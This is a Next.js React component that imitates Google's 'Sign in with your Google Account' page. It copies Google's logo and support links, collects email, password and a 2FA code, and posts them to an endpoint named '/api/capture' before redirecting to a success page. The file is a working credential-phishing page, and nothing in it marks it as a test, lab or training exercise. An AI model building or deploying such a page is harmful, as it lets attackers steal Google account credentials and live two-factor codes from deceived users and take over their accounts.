'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [twofa, setTwofa] = useState('');
  const [emailError, setEmailError] = useState('');
  const router = useRouter();

  const validateEmail = (email) => {
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    return gmailRegex.test(email);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validate email format
    if (!validateEmail(email)) {
      setEmailError('Please enter a valid Gmail address (e.g., something@gmail.com)');
      return;
    }
    setEmailError('');

    // Ensure password is not empty
    if (!password) {
      alert('Please enter your password');
      return;
    }

    try {
      const response = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, twofa }),
      });
      if (response.ok) {
        router.push('/success'); // Navigate to success page
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white text-black">
      <div className="bg-white p-6 rounded-lg border border-gray-300 w-96">
        <div className="flex justify-center mb-4">
          <img
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
            alt="Google Logo"
            className="h-8"
          />
        </div>
        <h2 className="text-xl text-center mb-2">Sign in</h2>
        <p className="text-sm text-gray-600 text-center mb-6">with your Google Account</p>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email or phone"
              className={`w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-600 ${
                emailError ? 'border-red-500' : 'border-gray-300'
              }`}
              required
            />
            {emailError && (
              <p className="text-red-500 text-xs mt-1">{emailError}</p>
            )}
          </div>
          <div className="mb-4">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
              required
            />
          </div>
          <div className="mb-6">
            <input
              type="text"
              value={twofa}
              onChange={(e) => setTwofa(e.target.value)}
              placeholder="2FA Code (if applicable)"
              className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
            />
          </div>
          <div className="text-sm mb-4">
            <a target='blank' href="https://support.google.com/accounts/answer/7682439?hl=en"><span className='text-blue-600 hover:underline'>Forgot email?</span></a>
            <span className="mx-1"></span>
            Not your computer? Use<a target='blank' href="https://support.google.com/chrome/answer/6130773?hl=en&co=GENIE.Platform%3DAndroid" > <span className='text-blue-600 hover:underline'>Guest mode</span> </a>to sign in privately.
            <span className="mx-1"></span>
            <a target='blank' href="https://learning.google/"><span className='text-blue-600 hover:underline'>Learn more</span></a>
          </div>
          <div className="flex justify-between items-center">
            <a target='blank' href="https://support.google.com/mail/answer/56256?hl=en" className="text-blue-600 text-sm hover:underline">Create account</a>
            <button
              type="submit"
              className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700"
            >
              Next
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}